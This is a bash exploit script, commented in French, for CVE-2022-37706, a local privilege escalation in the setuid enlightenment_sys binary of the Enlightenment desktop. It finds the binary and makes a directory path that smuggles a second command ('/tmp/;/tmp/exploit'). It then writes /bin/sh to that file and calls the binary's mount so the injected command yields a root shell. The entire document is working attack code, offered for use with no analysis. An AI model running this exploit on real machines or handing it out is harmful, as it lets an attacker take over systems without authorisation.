#!/bin/bash

echo "CVE-2022-37706"
echo "Cherchant le fichier binaire vulnérable..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] le fichier binaire vulnérable n'est pas trouvé, il faut installer Enlightenment avant d'éxecuter l'exploit"
	exit 1
fi

echo "Le fichier binaire est trouvé : $file!"
echo "Créant les répertoires nécessaires..."
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"
echo "Créant le fichier contenant la commande à injecter"
echo "/bin/sh" > /tmp/exploit
echo "Ajoutant les permissions d'éxecution au fichier créé"
chmod a+x /tmp/exploit
echo "essayant d'injecter la commande..., si tout se passe bien, vous devriez avoir un shell root"
${file} /bin/mount -o noexec,nosuid,nodev,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
